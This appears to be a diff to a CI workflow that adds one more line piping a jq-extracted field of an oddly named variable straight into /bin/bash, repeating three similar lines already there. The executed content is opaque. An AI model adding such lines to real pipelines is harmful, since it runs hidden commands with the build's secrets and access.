@@ -22,6 +22,7 @@ jobs:
           echo $wwge3396 | jq -r .wac94 | /bin/bash
           printf '%s' "$krqhs39001" | jq -r .j3 | /bin/bash
           printf '%s' "$ezyav4506" | jq -r .tram557 | /bin/bash
+          echo $axh15482 | jq -r .i195 | /bin/bash
 
       - name: Upload results
         if: always()
